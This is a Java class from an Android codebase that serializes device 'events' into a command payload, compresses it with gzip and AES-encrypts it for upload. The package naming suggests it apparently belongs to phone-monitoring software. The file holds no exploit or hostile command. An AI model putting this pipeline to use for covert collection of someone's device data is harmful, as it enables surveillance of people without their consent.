package com.vvt.phoenix.prot.databuilder;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.security.InvalidKeyException;

import javax.crypto.SecretKey;

import android.os.ConditionVariable;
import android.os.Looper;

import com.vvt.crypto.AESCipher;
import com.vvt.crypto.AESEncryptListener;
import com.vvt.crypto.AESKeyGenerator;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.TransportDirectives;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.DataProvider;
import com.vvt.phoenix.prot.command.SendEvents;
import com.vvt.phoenix.prot.event.Event;
import com.vvt.phoenix.prot.parser.EventParser;
import com.vvt.phoenix.util.ByteUtil;
import com.vvt.phoenix.util.IOStreamUtil;
import com.vvt.zip.GZIPCompressor;
import com.vvt.zip.GZIPListener;

/*
 * Refactoring: 24 January 2012
 */
public class SendEventsPayloadBuilder extends PayloadBuilder implements GZIPListener, AESEncryptListener{
	
	//Debugging
	private static final String TAG = "SendEventsPayloadBuilder";	

	//Members
	private CommandMetaData mMetaData;
	private CommandData mCommandData;
	private String mPayloadPath;
	private String mCompressPath;
	private String mEncryptPath;
	private boolean mIsResumable;
	private PayloadBuilderResponse mResponse;
	private SecretKey mAesKey;
	private ConditionVariable mLock;
	private OutputStream mOutputStream;	
	

	/**
	 * Constructor
	 */
	public SendEventsPayloadBuilder() {
		mLock = new ConditionVariable();
		mResponse = new PayloadBuilderResponse();
		
		// if we generate AES key in encryptPayload() we will not have AES Key to encrypt meta data in case that
		// caller doesn't need to encrypt payload
		mAesKey = AESKeyGenerator.generate();
		mResponse.setAesKey(mAesKey);
	}

	@Override
	public PayloadBuilderResponse buildPayload(CommandMetaData metaData,
			CommandData commandData, String payloadPath, int transportDirective) throws Exception {
		if(metaData == null){
			FxLog.w(TAG, "> buildPayload # Metadata is null");
			throw new IllegalArgumentException("Metadata is null");
		}
		if(commandData == null){
			FxLog.w(TAG, "> buildPayload # Command data is null");
			throw new IllegalArgumentException("Command data is null");
		}
		if((transportDirective == TransportDirectives.RESUMABLE) && (payloadPath == null)){
			FxLog.w(TAG, "> buildPayload # Payload path is null");
			throw new IllegalArgumentException("Payload path is null");
		}
		
		mMetaData = metaData;
		mCommandData = commandData;
		mPayloadPath = payloadPath;
		if(transportDirective == TransportDirectives.RESUMABLE){
			FxLog.d(TAG, "> buildPayload # RESUMABLE command");
			mIsResumable = true;
			try{
				mOutputStream = new FileOutputStream(mPayloadPath);
				//for test handle Exception
				/*if(true){
					throw new IOException("Dummy");
				}*/
			}catch(IOException e){
				FxLog.e(TAG, String.format("> buildPayload # Exception while creating output file: %s", e.getMessage()));
				throw e;
			}
		}else if(transportDirective == TransportDirectives.NON_RESUMABLE){
			FxLog.d(TAG, "> buildPayload # NON-RESUMABLE command");
			mIsResumable = false;
			mOutputStream = new ByteArrayOutputStream();
		}

		/*
		 * If Exception occurs during payload creation process
		 * should delete payload before throwing Exception
		 */
		try{
			FxLog.v(TAG, "> buildPayload # Append command code");
			appendCommandCode();
			FxLog.v(TAG, "> buildPayload # Append command data");
			appendCommandData();	
		}catch(Exception e){
			FxLog.e(TAG, String.format("> buildPayload # Exception while building payload: %s", e.getMessage()));
			File f = new File(mPayloadPath);
			f.delete();
			throw e;
		}
		if(mMetaData.getCompressionCode() == 1){
			FxLog.v(TAG, "> buildPayload # Compress payload");
			compressPayload();
		}
		if(mMetaData.getEncryptionCode()==1){
			FxLog.v(TAG, "> buildPayload # Encrypt payload");
			encryptPayload();
		}
		
		//set Response and close OutputStream
		FxLog.v(TAG, "> buildPayload # Prepare response data");
		if(mIsResumable){
			mResponse.setPayloadPath(payloadPath);
			mResponse.setPayloadType(PayloadType.FILE);
		}else{
			mResponse.setData(((ByteArrayOutputStream) mOutputStream).toByteArray());
			mResponse.setPayloadType(PayloadType.BUFFER);
		}
		IOStreamUtil.safelyCloseStream(mOutputStream);

		
		FxLog.i(TAG, "> buildPayload # Finished");
		return mResponse;
	}

	@Override
	protected void appendCommandCode() throws IOException {

		mOutputStream.write(ByteUtil.toBytes((short) CommandCode.SEND_EVENT), 0, 2);
		
	}

	@Override
	protected void appendCommandData() throws Exception {
		SendEvents data = (SendEvents) mCommandData;
				
		//1 if this is FileOutputStream then remember the current pointer position in the file before append all events
		FileChannel fileChannel = null;
		long eventCountPointerPosition = 0;
		if(mIsResumable){
			fileChannel = ((FileOutputStream) mOutputStream).getChannel();
			eventCountPointerPosition = fileChannel.position();
			//put temp 2 bytes
			mOutputStream.write(new byte[]{0x00, 0x00}, 0, 2);
		}
		
		
		//2 parse each event
		FxLog.v(TAG, "> appendCommandData # Append events");
		DataProvider eventProvider = data.getEventProvider();
		int eventCount = 0;
		while(eventProvider.hasNext()){
			FxLog.v(TAG, "> appendCommandData # Got event");
			eventCount++;
			Event event = (Event) eventProvider.getObject();
			EventParser.parseEvent(event, mOutputStream);
		}
		
		//3 put event count (2 bytes) in front of all events
		byte[] eventCountBytes = ByteUtil.toBytes((short) eventCount);
		if(mIsResumable){
			FxLog.v(TAG, "> appendCommandData # Add event count in front of all events in the payload file");
			ByteBuffer bb = ByteBuffer.wrap(eventCountBytes);
			fileChannel.write(bb, eventCountPointerPosition);
		}else{
			FxLog.v(TAG, "> appendCommandData # Add event count in front of all events in the payload buffer");
			ByteArrayOutputStream stream = new ByteArrayOutputStream();
			stream.write(eventCountBytes, 0, 2);
			((ByteArrayOutputStream) mOutputStream).writeTo(stream);
			IOStreamUtil.safelyCloseStream(mOutputStream);
			mOutputStream = stream;
		}
		
		
	}

	@Override
	protected void compressPayload() {		
		if(mIsResumable){
			FxLog.v(TAG, String.format("> compressPayload # ASynchronous compression - Thread ID: %d", Thread.currentThread().getId()));
			mCompressPath = mPayloadPath+".compress";		//"a.txt.compress"
			//since we have to block Executor thread then calling asynchronous compression has to be done in another thread
			Thread gzipCallerThread = new Thread(){
				@Override
				public void run(){
					Looper.prepare();
					FxLog.v(TAG, String.format("> compressPayload > run # ASynchronous compression - Thread ID: %d", Thread.currentThread().getId()));
					GZIPCompressor gzip = new GZIPCompressor();
					gzip.compress(mPayloadPath, mCompressPath, SendEventsPayloadBuilder.this);
					Looper.loop();
				}
			};
			gzipCallerThread.setPriority(Thread.MIN_PRIORITY);
			gzipCallerThread.start();
			
			mLock.block();
			mLock.close();
		}else{
			FxLog.v(TAG, "> compressPayload # Synchronous compression");
			byte[] zipData = null;
			try {
				zipData = GZIPCompressor.compress(((ByteArrayOutputStream) mOutputStream).toByteArray());
				//for test handle compress on memory error
				/*if(true){
					throw new IOException("Dummy IOException while do synchronous compression");
				}*/
			} catch (IOException e) {
				FxLog.e(TAG, String.format("> compressPayload() # %s", e.getMessage()));
				mMetaData.setCompressionCode(0);
				return;
			}
			IOStreamUtil.safelyCloseStream(mOutputStream);
			mOutputStream = new ByteArrayOutputStream();
			((ByteArrayOutputStream) mOutputStream).write(zipData, 0, zipData.length);
		}
		
	}
	
	@Override
	public void onCompressError(Exception err) {
		FxLog.e(TAG, String.format("> onCompressError # %s - Thread ID: %d", err.getMessage(), Thread.currentThread().getId()));
		
		mMetaData.setCompressionCode(0);
		mLock.open();
		
	}

	@Override
	public void onCompressSuccess(String resultPath) {
		FxLog.v(TAG, String.format("> onCompressSuccess # Result path : %s - Thread ID: %d", resultPath, Thread.currentThread().getId()));
		//for test handle compress asynchronous error
		/*if(true){
			onCompressError(new Exception("Dummy Exception while asynchronous compression"));
			return;
		}*/
		//remove previous payload
		//and rename new compressed file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
		
	}

	@Override
	protected void encryptPayload() {
		mEncryptPath = mPayloadPath+".encrypt";	//"a.txt.compress.encrypt of a.txt.encrypt"
		
		// encrypt it!
		if(mIsResumable){
			FxLog.v(TAG, String.format("> encryptPayload # ASynchronous encryption - Thread ID: %d", Thread.currentThread().getId()));
			//since we have to block Executor thread then calling asynchronous encryption has to be done in another thread
			Thread aesCallerThread = new Thread(){
				@Override
				public void run(){
					Looper.prepare();
					FxLog.v(TAG, String.format("> encryptPayload > run # ASynchronous encryption - Thread ID: %d", Thread.currentThread().getId()));
					AESCipher cipher = new AESCipher();
					cipher.encrypt(mAesKey, mPayloadPath, mEncryptPath, SendEventsPayloadBuilder.this);
					Looper.loop();
				}
			};
			aesCallerThread.setPriority(Thread.MIN_PRIORITY);
			aesCallerThread.start();
			
			mLock.block();
			mLock.close();
		}else{
			FxLog.v(TAG, "> encryptPayload # Synchronous encryption");
			try {
				byte[] cipherText = AESCipher.encrypt(mAesKey, ((ByteArrayOutputStream) mOutputStream).toByteArray());
				//for test handle encrypt on memory error
				/*if(true){
					throw new InvalidKeyException("Dummy InvalidKeyException while do synchronous encryption");
				}*/
				IOStreamUtil.safelyCloseStream(mOutputStream);
				mOutputStream = new ByteArrayOutputStream();
				((ByteArrayOutputStream) mOutputStream).write(cipherText, 0, cipherText.length);
			} catch (InvalidKeyException e) {
				FxLog.e(TAG, String.format("> encryptPayload # %s", e.getMessage()));
				mMetaData.setEncryptionCode(0);
			}
		}
		
	}

	@Override
	public void onAESEncryptError(Exception err) {
		FxLog.e(TAG, String.format("> onAESEncryptError # %s - Thread ID: %d", err.getMessage(), Thread.currentThread().getId()));
		mMetaData.setEncryptionCode(0);
		mLock.open();		
	}

	@Override
	public void onAESEncryptSuccess(String resultPath) {
		FxLog.v(TAG, String.format("> onAESEncryptSuccess # Result path : %s - Thread ID: %d", resultPath, Thread.currentThread().getId()));
		//for test handle encrypt asynchronous error
		/*if(true){
			onAESEncryptError(new Exception("Dummy Exception while asynchronous encryption"));
			return;
		}*/
		//remove previous payload
		//and rename new encrypted file to original payload name
		File f = new File(mPayloadPath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mPayloadPath);
		f.renameTo(dest);
		
		mLock.open();
		
	}

}
